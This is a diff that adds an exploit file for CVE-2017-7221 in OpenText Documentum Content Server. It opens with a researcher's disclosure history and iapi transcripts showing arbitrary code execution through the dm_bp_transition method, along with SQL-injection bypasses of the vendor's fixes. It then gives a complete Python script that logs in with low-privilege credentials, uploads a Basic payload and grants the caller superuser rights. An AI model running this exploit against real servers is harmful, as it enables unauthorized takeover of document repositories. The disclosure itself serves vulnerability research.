@@ -1,0 +1,598 @@
+'''
+CVE Identifier: CVE-2017-7221
+Vendor: OpenText
+Affected products: OpenText Documentum Content Server (all versions)
+Researcher: Andrey B. Panfilov
+Severity Rating: CVSS v3 Base Score: 8.8 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
+Fix: not available
+PoC: https://gist.github.com/andreybpanfilov/0a4fdfad561e59317a720e702b0fec44
+
+Description: 
+
+all versions of Documentum Content Server contain dm_bp_transition docbase 
+method ("stored procedure”) which is written on basic, implementation of this docbase 
+methods does not properly validate user input which allows attacker to execute arbitrary 
+code with superuser privileges.
+
+Related code snippet is:
+
+==========================================8<========================================
+
+'Evaluate the user-defined entry criteria
+If (result = True And run_entry = "T") Then
+If (debug = True) Then
+PrintToLog sess, "Run user defined entry criteria."
+End If
+'
+' researcher comment:
+' userEntryID parameter is controlled by attacker
+'
+result = RunProcedure(userEntryID, 1, sess, sysID,_
+user_name, targetState)
+End If
+
+...
+
+'
+' researcher comment:
+' procID parameter is controlled by attacker
+'
+
+Function RunProcedure(procID As String, procNo As Integer,_
+sessID As String, objID As String, userName As String,_
+targetState As String) As Boolean
+
+...
+
+StartIt:
+If (procID <> "0000000000000000") Then
+result = CheckStatus("", 1, "loading procedure " & procID, True, errorMsg)
+'
+' researcher comment:
+' here basic interpreter loads content of user-provided script
+' from underlying repostiory using following technique:
+' 
+' checking that it is dealing with dm_procedure object
+' (check was introduced in CVE-2014-2513):
+' id,c,dm_procedure where r_object_id='procID'
+' 
+' getting content of basic script
+' fetch,c,procID
+' getpath,c,l
+'
+
+result = external(procID)
+If (result = True) Then
+If (procNo = 1) Then
+' --- Running user-defined entry criteria ---
+result = CheckStatus("", 1, "Running EntryCriteria", True, errorMsg)
+On Error Goto NoFunction
+'
+' researcher comment
+' here dmbasic interpreter executes user defined function
+'
+result = EntryCriteria(sessID, objID, userName,_
+targetState, errorStack)
+If (result = False) Then
+errorStack = "[ErrorCode] 1500 [ServerError] " + _
+errorStack
+End If
+
+==========================================>8========================================
+
+So, attacker is able to create it’s own basic procedure in repository and pass it’s identifier
+as argument for dm_bp_transition procedure:
+
+
+==========================================8<========================================
+$ cat /tmp/test
+cat: /tmp/test: No such file or directory
+$ cat > test.ebs
+Public Function EntryCriteria(ByVal SessionId As String,_
+ByVal ObjectId As String,_
+ByVal UserName As String,_
+ByVal TargetState As String,_
+ByRef ErrorString As String) As Boolean
+t = ShellSync("echo dm_bp_transition_has_vulnerability > /tmp/test")
+EntryCriteria=True
+End Function
+$ iapi
+Please enter a docbase name (docubase): repo
+Please enter a user (dmadmin): unprivileged_user
+Please enter password for unprivileged_user:
+
+
+EMC Documentum iapi - Interactive API interface
+(c) Copyright EMC Corp., 1992 - 2011
+All rights reserved.
+Client Library Release 6.7.1000.0027
+
+
+Connecting to Server using docbase repo
+[DM_SESSION_I_SESSION_START]info: "Session 0101d920800b1a37
+started for user unprivileged_user."
+
+
+Connected to Documentum Server running Release 6.7.1090.0170 Linux.Oracle
+Session id is s0
+API> create,c,dm_procedure
+...
+0801d920804e5416
+API> set,c,l,object_name
+SET> test
+...
+OK
+API> setfile,c,l,test.ebs,crtext
+...
+OK
+API> save,c,l
+...
+OK
+API> ?,c,execute do_method with method='dm_bp_transition',
+arguments='repo repo dmadmin "" 0000000000000000 0000000000000000
+0000000000000000 0801d920804e5416 0000000000000000 0000000000000000
+0000000000000000 "" 0 0 T F T T dmadmin 0000000000000000'
+(1 row affected)
+
+API> Bye
+$ cat /tmp/test
+dm_bp_transition_has_vulnerability
+
+==========================================>8========================================
+
+
+Vendor was been notified about this vulnerability on November 2013 using customer 
+support channel, after a while vendor started claiming that this vulnerability 
+was remediated, though no CVE was announced. Moreover, the fix was contested
+and CERT/CC started tracking this vulnerability, the PoC provided
+to CERT/CC was:
+
+==========================================8<========================================
+Vendor have decided that the root cause of problem is users are able to
+create dm_procedure objects, and now in Documentum Content Server
+v6.7SP1P26 we have following behavior:
+
+[DM_SESSION_I_SESSION_START]info: "Session 0101d920800f0174 started for
+user unprivileged_user."
+
+
+Connected to Documentum Server running Release 6.7.1260.0322 Linux.Oracle
+Session id is s0
+API> create,c,dm_procedure
+...
+0801d920805929d0
+API> set,c,l,object_name
+SET> test
+...
+OK
+API> setfile,c,l,test.ebs,crtext
+...
+OK
+API> save,c,l
+...
+[DM_USER_E_NEED_SU_OR_SYS_PRIV]error: "The current user
+(unprivileged_user) needs to have superuser or sysadmin privilege."
+
+BUT:
+
+API> create,c,dm_document
+...
+0901d920805929dd
+API> set,c,l,object_name
+SET> test
+...
+OK
+API> setfile,c,l,test.ebs,crtext
+...
+OK
+API> save,c,l
+...
+OK
+
+API> ?,c,execute do_method with
+method='dm_bp_transition',arguments='repo repo dmadmin ""
+0000000000000000 0000000000000000 0000000000000000 0901d920805929dd
+0000000000000000 0000000000000000 0000000000000000 "" 0 0 T F T T
+dmadmin 0000000000000000'
+(1 row affected)
+
+....
+
+API> Bye
+~]$ cat /tmp/test
+dm_bp_transition_has_vulnerability
+~]$
+
+==========================================>8========================================
+
+On July 2014 vendor announced ESA-2014-064 which was claiming that vulnerability has been remediated.
+
+On November 2014 fix was contested (there was significant delay after ESA-2014-064 because vendor 
+constantly fails to provide status of reported vulnerabilities) by providing another proof of concept, 
+description provided to CERT/CC was:
+
+==========================================8<========================================
+I have tried to reproduce PoC, described in VRF#HUFPRMOP, and got following
+error:
+
+[ErrorCode] 1000 [Parameter] 0801fd08805c9dfe [ServerError] Unexpected
+error: [DM_API_W_NO_MATCH]warning: "There was no match in the
+docbase for the qualification: dm_procedure where r_object_id =
+'0801fd08805c9dfe'"
+
+Such behaviour means that EMC tried to remediate a security issue by
+"checking" object type of supplied object:
+
+Connected to Documentum Server running Release 6.7.2190.0198 Linux.Oracle
+Session id is s0
+API> id,c,dm_procedure where r_object_id = '0801fd08805c9dfe'
+...
+[DM_API_W_NO_MATCH]warning: "There was no match in the docbase for the
+qualification: dm_procedure where r_object_id = '0801fd08805c9dfe'"
+
+API> Bye
+
+bin]$ strings dmbasic| grep dm_procedure
+id,%s,dm_procedure where object_name = '%s' and folder('%s')
+id,%s,dm_procedure where r_object_id = '%s'
+# old version of dmbasic binary
+bin]$ strings dmbasic| grep dm_procedure
+bin]$
+
+So, the fix was implemented in dmbasic binary, the problem is neither 6.7
+SP2 P15 nor 6.7 SP1 P28 patches contain dmbasic binary - the first patch
+that was shipped with dmbasic binary was 6.7SP2 P17. Moreover, the
+issue is still reproducible because introduced check could be bypassed
+using SQL injection:
+
+~]$ cat test.ebs
+Public Function EntryCriteria(ByVal SessionId As String,_
+ByVal ObjectId As String,_
+ByVal UserName As String,_
+ByVal TargetState As String,_
+ByRef ErrorString As String) As Boolean
+t = ShellSync("echo dm_bp_transition_has_vulnerability > /tmp/test")
+EntryCriteria=True
+End Function
+~]$ cat /tmp/test
+cat: /tmp/test: No such file or directory
+
+~]$ iapi
+Please enter a docbase name (docubase): repo
+Please enter a user (dmadmin): test01
+Please enter password for test01:
+
+
+EMC Documentum iapi - Interactive API interface
+(c) Copyright EMC Corp., 1992 - 2011
+All rights reserved.
+Client Library Release 6.7.2190.0142
+
+
+Connecting to Server using docbase repo
+[DM_SESSION_I_SESSION_START]info: "Session 0101fd088014000c started for
+user test01."
+
+
+Connected to Documentum Server running Release 6.7.2190.0198 Linux.Oracle
+Session id is s0
+API> create,c,dm_sysobject
+...
+0801fd08805c9dfe
+API> set,c,l,object_name
+SET> test
+...
+OK
+API> setfile,c,l,test.ebs,crtext
+...
+OK
+API> save,c,l
+...
+OK
+API> ?,c,execute do_method WITH METHOD='dm_bp_transition', ARGUMENTS='
+repo repo dmadmin "" 0000000000000000 0000000000000000
+0000000000000000 "0801fd08805c9dfe,'' union select r_object_id
+from dm_sysobject where r_object_id=''0801fd08805c9dfe"
+0000000000000000 0000000000000000 0000000000000000 ""
+0 0 T F T T dmadmin 0000000000000000'
+
+...
+
+(1 row affected)
+
+API> Bye
+~]$ cat /tmp/test
+dm_bp_transition_has_vulnerability
+~]$
+
+Here "union ..." allows to bypass check based on "id" call:
+
+Connected to Documentum Server running Release 6.7.2190.0198 Linux.Oracle
+Session id is s0
+API> id,c,dm_procedure where r_object_id='0801fd08805c9dfe,' union
+select r_object_id from dm_sysobject where
+r_object_id='0801fd08805c9dfe'
+...
+0801fd08805c9dfe
+API> apply,c,,GET_LAST_SQL
+...
+q0
+API> next,c,q0
+...
+OK
+API> get,c,q0,result
+...
+
+select all dm_procedure.r_object_id from dm_procedure_sp dm_procedure where
+((dm_procedure.r_object_id='0801fd08805c9dfe,')) and
+(dm_procedure.i_has_folder = 1 and dm_procedure.i_is_deleted = 0)
+union select all dm_sysobject.r_object_id from dm_sysobject_sp
+dm_sysobject where ((dm_sysobject.r_object_id= '0801fd08805c9dfe'))
+and (dm_sysobject.i_has_folder = 1 and dm_sysobject.i_is_deleted = 0)
+
+API> close,c,q0
+...
+OK
+
+Comma is required to bypass error in fetch call:
+API> fetch,c,0801fd08805c9dfe' union select r_object_id from
+dm_sysobject where r_object_id='0801fd08805c9dfe
+...
+[DM_API_E_BADID]error: "Bad ID given: 0801fd08805c9dfe' union
+select r_object_id from dm_sysobject where r_object_id=
+'0801fd08805c9dfe"
+
+
+API> fetch,c,0801fd08805c9dfe,' union select r_object_id from
+dm_sysobject where r_object_id='0801fd08805c9dfe
+...
+OK
+==========================================>8========================================
+
+On August 2015 vendor had undertaken another attempt to remediate this vulnerability
+check ESA-2015-131/CVE-2015-4533 for details.
+
+On August 2015 the fix was contested, check http://seclists.org/bugtraq/2015/Aug/110
+for detailed description - I just demonstrated another attack vector - using 
+UNION ALL keyword instead of UNION:
+
+=================================8<================================
+API> ?,c,execute do_method WITH METHOD='dm_bp_transition', ARGUMENTS='
+repo repo dmadmin "" 0000000000000000 0000000000000000
+0000000000000000 "0801fd08805c9dfe,'' union select r_object_id
+from dm_sysobject where r_object_id=''0801fd08805c9dfe"
+0000000000000000 0000000000000000 0000000000000000 ""
+0 0 T F T T dmadmin 0000000000000000'
+
+[DM_METHOD_E_METHOD_ARGS_INVALID]error:
+"The arguments being passed to the method 'dm_bp_transition' are
+invalid:
+arguments contain sql keywords which are not allowed."
+
+
+New attack vector (note ALL keyword):
+
+API> ?,c,execute do_method WITH METHOD='dm_bp_transition', ARGUMENTS='
+repo repo dmadmin "" 0000000000000000 0000000000000000
+0000000000000000 "0801fd08805c9dfe,'' union all select r_object_id
+from dm_sysobject where r_object_id=''0801fd08805c9dfe"
+0000000000000000 0000000000000000 0000000000000000 ""
+0 0 T F T T dmadmin 0000000000000000'
+
+=================================>8================================
+
+
+Recently I have noticed that latest versions of Documentum Content
+Server are not affected by the PoC provided above, however all versions
+of Documentum Content Server are still vulnerable because vendor incorrectly
+implemented input validation: they convert arguments to lower/upper-case, 
+replace line feed, carriage return and tab characters by a space, 
+remove double spaces, after that they check where resulting string contains 
+special keywords ('union ' and 'union all') or not - it is possible 
+to use other whitespace characters like backspace, which is demonstrated
+in the PoC.      
+
+
+__
+
+Regards,
+Andrey B. Panfilov
+
+
+
+CVE-2017-7221.py
+'''
+
+#!/usr/bin/env python
+
+import socket
+import sys
+from os.path import basename
+
+from dctmpy.docbaseclient import DocbaseClient
+from dctmpy.obj.typedobject import TypedObject
+
+CIPHERS = "ALL:aNULL:!eNULL"
+
+
+def usage():
+    print "usage:\n\t%s host port user password" % basename(sys.argv[0])
+
+
+def main():
+    if len(sys.argv) != 5:
+        usage()
+        exit(1)
+
+    (session, docbase) = create_session(*sys.argv[1:5])
+
+    if is_super_user(session):
+        print "Current user is a superuser, nothing to do"
+        exit(1)
+
+    install_owner = session.serverconfig['r_install_owner']
+    document_id = session.next_id(0x08)
+    content_id = session.next_id(0x06)
+
+    store = session.get_by_qualification("dm_store")
+    format = session.get_by_qualification("dm_format where name='crtext'")
+    handle = session.make_pusher(store['r_object_id'])
+    if handle < 1:
+        print "Unable to create pusher"
+        exit(1)
+
+    data = "Public Function EntryCriteria(ByVal SessionId As String,_" \
+           "\nByVal ObjectId As String,_" \
+           "\nByVal UserName As String,_" \
+           "\nByVal TargetState As String,_" \
+           "\nByRef ErrorString As String) As Boolean" \
+           "\nDim QueryID As String" \
+           "\nDim Query As String" \
+           "\nQuery = \"query,c,update dm_user objects set " \
+           "user_privileges=16 where user_name=\'%s\'\"" \
+           "\nQueryID = dmAPIGet(Query)" \
+           "\nQueryID = dmAPIExec(\"commit,c\")" \
+           "\nEntryCriteria=True" \
+           "\nEnd Function" % (sys.argv[3])
+
+    b = bytearray()
+    b.extend(data)
+
+    if not session.start_push(handle, content_id, format['r_object_id'], len(b)):
+        print "Failed to start push"
+        exit(1)
+
+    session.upload(handle, b)
+    data_ticket = session.end_push_v2(handle)['DATA_TICKET']
+
+    procedure = False
+    try:
+        print "Trying to create dm_procedure"
+        document = TypedObject(session=session)
+        document.set_string("OBJECT_TYPE", "dm_procedure")
+        document.set_bool("IS_NEW_OBJECT", True)
+        document.set_int("i_vstamp", 0)
+        document.set_int("world_permit", 7)
+        document.set_string("object_name", "CVE-2014-2513")
+        document.set_string("r_object_type", "dm_procedure")
+        document.append_id("i_contents_id", content_id)
+        document.set_int("r_page_cnt", 1)
+        document.set_string("a_content_type", format['name'])
+        document.set_bool("i_has_folder", True)
+        document.set_bool("i_latest_flag", True)
+        document.set_id("i_chronicle_id", document_id)
+        document.append_string("r_version_label", ["1.0", "CURRENT"])
+        document.set_int("r_content_size", len(b))
+        if session.sys_obj_save(document_id, document):
+            procedure = True
+    except Exception, e:
+        print str(e)
+
+    if not procedure:
+        print "Failed to create dm_procedure"
+        print "Trying to create dm_sysobject"
+        document = TypedObject(session=session)
+        document.set_string("OBJECT_TYPE", "dm_sysobject")
+        document.set_bool("IS_NEW_OBJECT", True)
+        document.set_int("i_vstamp", 0)
+        document.set_string("owner_name", sys.argv[3])
+        document.set_int("world_permit", 7)
+        document.set_string("object_name", "CVE-2017-7221")
+        document.set_string("r_object_type", "dm_sysobject")
+        document.append_id("i_contents_id", content_id)
+        document.set_int("r_page_cnt", 1)
+        document.set_string("a_content_type", format['name'])
+        document.set_bool("i_has_folder", True)
+        document.set_bool("i_latest_flag", True)
+        document.set_id("i_chronicle_id", document_id)
+        document.append_string("r_version_label", ["1.0", "CURRENT"])
+        document.set_int("r_content_size", len(b))
+        if not session.sys_obj_save(document_id, document):
+            print "Failed to create dm_sysobject"
+            exit(1)
+
+    content = TypedObject(session=session)
+    content.set_string("OBJECT_TYPE", "dmr_content")
+    content.set_bool("IS_NEW_OBJECT", True)
+    content.set_id("storage_id", store['r_object_id'])
+    content.set_id("format", format['r_object_id'])
+    content.set_int("data_ticket", data_ticket)
+    content.set_id("parent_id", document_id)
+    content.set_int("page", 0)
+    content.set_string("full_format", format['name'])
+    content.set_int("content_size", len(b))
+    if not session.save_cont_attrs(content_id, content):
+        print "Failed to create content"
+        exit(1)
+
+    if procedure:
+        query = "execute do_method WITH METHOD='dm_bp_transition'," \
+                " ARGUMENTS='%s %s %s \"\" 0000000000000000 " \
+                "0000000000000000 0000000000000000 \"%s\" " \
+                "0000000000000000  0000000000000000 0000000000000000 " \
+                "\"\" 0 0 T F T T %s %s'" % \
+                (docbase, docbase, install_owner, document_id,
+                 install_owner, session.session)
+    else:
+        query = "execute do_method WITH METHOD='dm_bp_transition'," \
+                " ARGUMENTS='%s %s %s \"\" 0000000000000000 " \
+                "0000000000000000 0000000000000000 \"%s,'' " \
+                "union\b select r_object_id from  dm_sysobject(all) where r_object_id=''%s\" " \
+                "0000000000000000  0000000000000000 0000000000000000 " \
+                "\"\" 0 0 T F T T %s %s'" % \
+                (docbase, docbase, install_owner, document_id,
+                 document_id, install_owner, session.session)
+
+    session.query(query)
+
+    r = session.query(
+        "select user_privileges from dm_user "
+        "where user_name=USER") \
+        .next_record()['user_privileges']
+    if r != 16:
+        print "Failed"
+        exit(1)
+    print "P0wned!"
+
+
+def create_session(host, port, user, pwd, identity=None):
+    print "Trying to connect to %s:%s as %s ..." % \
+          (host, port, user)
+    session = None
+    try:
+        session = DocbaseClient(
+            host=host, port=int(port),
+            username=user, password=pwd,
+            identity=identity)
+    except socket.error, e:
+        if e.errno == 54:
+            session = DocbaseClient(
+                host=host, port=int(port),
+                username=user, password=pwd,
+                identity=identity,
+                secure=True, ciphers=CIPHERS)
+        else:
+            raise e
+    docbase = session.docbaseconfig['object_name']
+    version = session.serverconfig['r_server_version']
+    print "Connected to %s:%s, docbase: %s, version: %s" % \
+          (host, port, docbase, version)
+    return (session, docbase)
+
+
+def is_super_user(session):
+    user = session.get_by_qualification(
+        "dm_user WHERE user_name=USER")
+    if user['user_privileges'] == 16:
+        return True
+    group = session.get_by_qualification(
+        "dm_group where group_name='dm_superusers' "
+        "AND any i_all_users_names=USER")
+    if group is not None:
+        return True
+
+    return False
+
+
+if __name__ == '__main__':
+    main()
